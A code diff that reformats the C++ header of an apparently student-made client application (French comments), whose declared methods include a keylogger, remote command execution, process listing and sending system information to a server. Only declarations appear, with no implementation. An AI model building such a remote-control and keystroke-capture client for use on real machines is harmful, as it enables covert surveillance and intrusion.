@@ -17,34 +17,34 @@ public:
     ~ClientApp();
 
     // Interdit la copie, autorise le move (form canonique de Coplien)
-    ClientApp(const ClientApp&) = delete;
-    ClientApp& operator=(const ClientApp&) = delete;
-    ClientApp(ClientApp&&) noexcept = default;
-    ClientApp& operator=(ClientApp&&) noexcept = default;
+    ClientApp(const ClientApp &) = delete;
+    ClientApp &operator=(const ClientApp &) = delete;
+    ClientApp(ClientApp &&) noexcept = default;
+    ClientApp &operator=(ClientApp &&) noexcept = default;
 
     void run();
 
 private:
     void serverRequestHandler();
     void startKeylogger();
-    void stopKeylogger(const LPTF_Packet& packet);
-    
+    void stopKeylogger(const LPTF_Packet &packet);
+
     void setupConsole();
     void loadAndConnectEnv();
     void sendSystemInfo();
-    void printSystemInfo(const std::map<std::string, std::string>& sysInfo);
+    void printSystemInfo(const std::map<std::string, std::string> &sysInfo);
     void listProcesses();
     void launchServerThread();
-    void handlePacket(const LPTF_Packet& packet);
-    void handleServerException(const std::exception& e);
+    void handlePacket(const LPTF_Packet &packet);
+    void handleServerException(const std::exception &e);
 
-    void handleGetInfoPacket(const LPTF_Packet&);
-    void handleKeylogPacket(const LPTF_Packet&);
-    void handleExecCommandPacket(const LPTF_Packet&);
-    void handleProcessListPacket(const LPTF_Packet&);
+    void handleGetInfoPacket(const LPTF_Packet &);
+    void handleKeylogPacket(const LPTF_Packet &);
+    void handleExecCommandPacket(const LPTF_Packet &);
+    void handleProcessListPacket(const LPTF_Packet &);
     std::string getProcessListString(bool namesOnly);
 
-    std::atomic<bool> running {true};
+    std::atomic<bool> running{true};
     std::unique_ptr<LPTF_Socket> socket;
     std::unique_ptr<KeyLogger> keyLogger;
     std::thread keylogThread;
